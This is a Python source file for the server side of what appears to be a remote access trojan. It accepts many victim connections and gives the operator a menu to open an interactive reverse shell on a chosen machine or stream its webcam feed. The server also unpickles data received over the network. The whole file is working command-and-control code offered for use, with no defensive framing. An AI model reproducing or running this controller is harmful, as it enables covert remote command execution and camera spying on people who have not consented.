import socket
import sys
import time
import threading
from queue import Queue
import struct
import cv2
import pickle

HOST = '0.0.0.0'
PORT = 5000

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []

def socket_create():
    try:
        print("Creating a socket")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return server_socket
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def socket_bind(server_socket):
    try:
        print("Binding socket to port: " + str(PORT))
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind(server_socket)

# Accept connection from multiple clients and save to list
def accept_connections(server_socket):
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            connection, address = server_socket.accept()
            connection.setblocking(1)
            all_connections.append(connection)
            all_addresses.append(address)
            print("Connection has been established | " + "IP " + str(address[0]) + " | Port " + str(address[1]))
        except:
            print("Error accepting connections")

# Print help info and menu of actions user can choose from
def printMenu():
    print('----- RSC menu -----')
    print('list - lists server_sockets')
    print('select --number - choose a target from server_socket list and start a reverse shell')
    print('camera --number - choose a target from server_socket list and start capturing camera view')
    print('help - prints that info')
    print('-------------------------')

# Interactive prompt
def start_turtle():
    printMenu()
    while True:
        command = input('RSC> ')
        if command == 'list':
            list_connections()
        elif command == 'help':
            printMenu()
        elif 'select' in command:
            connection = get_target(command, 1)
            if connection is not None:
                send_target_commands(connection)
        elif 'camera' in command: 
            connection = get_target(command, 2)
            if connection is not None:
                receiveCameraData(connection)
        else:
            print("Command not recognized")

def list_connections():
    results = ''
    for i, connection in enumerate(all_connections):
        try:
            connection.send(str.encode('connect'))
            connection.recv(4096)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '  |  ' + str(all_addresses[i][0]) + '  |  ' + str(all_addresses[i][1]) + '\n'
    print('----- Clients -----' + '\n' + results)

def get_target(command, type):
    try:
        if type == 1:
            target = int(command.replace('select ', ''))
        elif type == 2:
            target = int(command.replace('camera ', ''))
        connection = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return connection
    except:
        print("Not a valid selection")
        return None

def send_target_commands(connection):
    connection.send(str.encode('2', "utf-8"))
    while True:
        try:
            command = input()
            if command == 'quit':
                print("Wysylanie zakonczenia")
                connection.send(str.encode('q', "utf-8"))
                print("Wysylano")
                break
            elif len(str.encode(command)) > 0:
                connection.send(str.encode(command))
                client_response = str(connection.recv(4096), "utf-8", "ignore")
                print(client_response, end="")
        except:
            print("Connection was lost")
            break
    print("Reverse shell closed")


def receiveCameraData(connection):
    connection.send(str.encode('1', "utf-8"))
    data = b""
    payload_size = struct.calcsize(">L")
    while True:
        while len(data) < payload_size:
            data += connection.recv(4096)

        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_msg_size)[0]

        while len(data) < msg_size:
            data += connection.recv(4096)
        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow('ImageWindow',frame)
        key = cv2.waitKey(33)
        if key == 27: #Esc key to stop
            connection.send(str.encode('q', "utf-8"))
            print("Stop signal sent")
            break

    cv2.destroyAllWindows()

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()

# Do the next job in the queue (one handles connections, other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            server_socket = socket_create()
            socket_bind(server_socket)
            accept_connections(server_socket)
        if x == 2:
            start_turtle()
        queue.task_done()

# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
   
def main():
    create_workers()
    create_jobs()

if __name__ == "__main__":
    main()
